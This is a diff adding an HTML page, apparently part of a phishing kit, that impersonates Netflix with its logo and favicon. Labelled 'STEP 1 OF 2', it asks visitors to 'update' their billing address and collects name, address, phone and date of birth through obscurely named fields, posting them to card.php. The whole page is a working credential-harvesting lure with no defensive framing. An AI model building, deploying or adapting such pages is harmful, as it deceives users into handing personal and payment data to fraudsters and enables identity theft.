@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="step1.css">
+  <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"/>
+  <title>Net-Flix</title>
+</head>
+<body>
+  <div class="navegacion">
+    <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fyetiograch.pl%2Fwp-content%2Fuploads%2F2016%2F01%2FNetflix-Logo.png&f=1&nofb=1" alt="">
+  <form action="card.php" method="post">
+    <div class="" id="step2">
+      <div class="step">
+        <div class="alineacion">
+          <div class="stepID" style="text-align: center;">STEP <b>1</b> OF <b>2</b></div>
+        <h1 style="text-align: center;">Update your billing address.</h1>
+        <div class="form">
+          <div class="inputpack">
+            <input type="text" id="firstnamecard" name="one" placeholder="Name" spellcheck="false" autocomplete="off"/>
+          </div>
+          <div class="error" id="firstnameError"></div>
+          <div class="inputpack">
+            <input type="text" id="lastnamecard" name="two" spellcheck="false" autocomplete="off" placeholder="Lastname" />
+          </div>
+          <div class="error" id="lastnameError"></div>
+          <div class="inputpack">
+            <input type="text" id="address" id="address" name="tree" placeholder="Direction" spellcheck="false" autocomplete="off"/>
+          </div>
+          <div class="error" id="addressError"></div>
+          <div class="inputpack">
+            <input type="text" id="city" id="city" placeholder="Country" name="four" spellcheck="false" autocomplete="off"/>
+          </div>
+          <div class="error" id="cityError"></div>
+          <div class="twopac">
+            <div class="inputpack">
+              <input type="text" id="state" id="state" placeholder="State" name="five" spellcheck="false" autocomplete="off"/>
+            </div>
+            <div class="inputpack">
+              <input type="text" id="zip" id="zip" maxlength="5" name="six" placeholder="Postal Code" spellcheck="false" autocomplete="off"/>
+            </div>
+          </div>
+          <div class="error" id="statezipError"></div>
+          <div class="inputpack">
+            <input type="number" id="phone" spellcheck="false" name="seven" autocomplete="off" placeholder="Phone" />
+          </div>
+          <div class="error" id="phoneError"></div>
+          <div class="inputpack">
+            <input type="date" id="dob" spellcheck="false" placeholder="Date of birth (YYYY/MM/DD)" name="eigth" autocomplete="off"/>
+            
+          </div>
+          <div class="error" id="dobError"></div>
+          <button id="submit_btn"><div id="content"  style="">Update billing address
+            </div>
+            <div id="loading" class="btn btn-default ld-ext-middle running" style="font-size : 1.5em; margin-top : 2px; display: none;">
+              <div class="ld ld-ring ld-cycle running"></div>
+            </div>
+          </button>
+          <div class="botonfachero">
+            <style>
+              .botonfachero {
+                margin-top: 10px;
+                padding: 10px;
+                width: 100px;
+                border-radius: 5px; 
+                border: 1px solid #000;
+                background-color: transparent;
+              }
+              .botonfachero a {
+                text-decoration: none;
+                color: #000;
+
+              }
+            </style>
+            <a href="../step1.php">Spanish</a>
+          </div>
+        </div>
+        </div>
+      </div>
+    </div>
+        </div>
+      </div>
+    </div>
+    </form>
+</body>
+</html>
